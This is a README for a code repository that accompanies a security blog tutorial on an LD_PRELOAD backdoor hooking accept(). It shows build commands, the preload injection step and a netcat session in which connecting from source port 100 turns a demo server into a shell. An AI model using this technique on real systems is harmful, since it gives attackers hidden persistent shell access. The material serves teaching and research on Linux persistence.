# LD_PRELOAD-accept-backdoor
Code samples to go along with the blog post on how to create an LD_PRELOAD backdoor hooking accept()

## Links to Tutorials
Blog: [LD_PRELOAD: Making a Backdoor by Hijacking accept()](https://www.secureideas.com/blog/ld_preload-making-a-backdoor-by-hijacking-accept)

## Overview
This repo is used to provide some code samples to go along side a tutorial in the Secure Ideas blog. This code repo will provide you with the code for:

 * A simple What's My IP server binary target
 * The LD_PRELOAD accept() backdoor code
 * A make file to build it easily in a Kali VM.

The goal of this tutorial is to show how to use LD_PRELOAD to turn any process using accept() into a potential backdoor. The backdoor triggers when an attacker connects to the service from TCP port 100 and will turn the service into a shell instead.

## Building The Code Using Make.
Once you clone the repo, simply change into the directory and run ```make``` or ```make all``` to build both the target and the LD_PRELOAD hijack shared object. The make file also includes a help option to show all of the build targets:

```
kali@kali:~$ make help
Default Target:
         all => Build standard non-debug builds of the accept_backdoor.so and whats_my_ip

What's My IP Targets:
         whats_my_ip => Build the whats_my_ip server application

Accept_Backdoor Targets:
         accept_backdoor.so => Build the standard non-debug build of the accept_backdoor.so
         accept_backdoor.so_debug => Build debug LD_PRELOAD accept_backdoor.so shared object.
         accept_backdoor.so_nocolor => Build non-colorized debug LD_PRELOAD accept_backdoor.so shared object.

Maintance Targets:
         clean => delete the binaries.

kali@kali:~$
```

## Basic What's My IP Usage
Standard What's My IP build and usage:
```
kali@kali:~$ make whats_my_ip
gcc -O3 src/whats_my_ip.c -o whats_my_ip
kali@kali:~$ /whats_my_ip 

        ---===[ What's my IP Service ]===---

 [*] Server started on 0.0.0.0:1337
 [*] Client Connected: 127.0.0.1:37056
 [*] Client Connected: 127.0.0.1:37058
^C
 [*]Caught Ctrl+C, Shutting down the server..

kali@kali:~$
```

From another terminal, you can simple connect to the service using netcat to use it normally.

```
kali@kali:~$ nc 127.0.0.1 1337

 [*] IP Address: 127.0.0.1
 [*] Source Port: 37056

kali@kali:~$ nc 127.0.0.1 1337

 [*] IP Address: 127.0.0.1
 [*] Source Port: 37058

```

## Building and injecting accept_backdoor.so
```
kali@kali:~$ make accept_backdoor.so          
gcc -O3 -FPIC -shared src/accept_backdoor.c -o accept_backdoor.so  -ldl
kali@kali:~$ D_PRELOAD=./accept_backdoor.so ./whats_my_ip

        ---===[ What's my IP Service ]===---

 [*] Server started on 0.0.0.0:1337
```

Then from another terminal, use netcat to connect to the services from TCP source port 100 to open the backdoor:

```
kali@kali:~$ nc 127.0.0.1 1337

 [*] IP Address: 127.0.0.1
 [*] Source Port: 37060
 
kali@kali:~$ sudo nc -p 100 127.0.0.1 1337
       _____ ______________  ______  ______
      / ___// ____/ ____/ / / / __ \/ ____/
      \__ \/ __/ / /   / / / / /_/ / __/   
     ___/ / /___/ /___/ /_/ / _, _/ /___   
    /____/_____/\____/\____/_/ |_/_____/   
                                           
        ________  _________   _____        
       /  _/ __ \/ ____/   | / ___/        
       / // / / / __/ / /| | \__ \         
     _/ // /_/ / /___/ ___ |___/ /         
    /___/_____/_____/_/  |_/____/          

 [+] Backdoor activated! Enjoy!

ls
total 44
-rw-r--r-- 1 kali kali  1216 May 18 10:55 Makefile
-rwxr-xr-x 1 kali kali 15768 May 18 10:59 accept_backdoor.so
drwxr-xr-x 2 kali kali  4096 May 17 14:50 src
-rwxr-xr-x 1 kali kali 16880 May 18 10:56 whats_my_ip
whoami
kali
exit

kali@kali:~$
```
